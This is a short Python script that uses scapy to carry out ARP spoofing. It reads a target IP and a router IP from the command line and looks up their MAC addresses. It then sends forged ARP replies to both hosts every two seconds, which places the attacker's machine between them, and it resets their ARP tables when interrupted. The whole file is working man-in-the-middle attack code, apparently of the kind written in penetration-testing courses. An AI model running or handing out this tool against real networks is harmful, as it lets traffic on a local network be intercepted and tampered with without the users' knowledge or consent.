#!/usr/bin/env python
import argparse
import time
import scapy.all as scapy


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Target IP')
    parser.add_argument('-r', '--router', dest='router', help='Router IP')
    options = parser.parse_args()
    if not options.target:
        parser.error('[-] Pls enter option -t with target IP')
    if not options.router:
        parser.error('[-] Pls enter option -r with router IP')
    return options


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_lst = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    #ARP request

    return answered_lst[0][1].hwsrc


def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)   
    scapy.send(packet, verbose=False) 


def restore(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(packet, count=4, verbose=False)


option = get_arguments()
sent_packet_count = 0

try:
    while True:
        spoof(option.target, option.router)
        spoof(option.router, option.target)
        sent_packet_count += 2
        print(f'\r[+] Sent packets: {sent_packet_count}', end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] ...Resetting ARP tables')
    restore(option.target, option.router)
    restore(option.router, option.target)

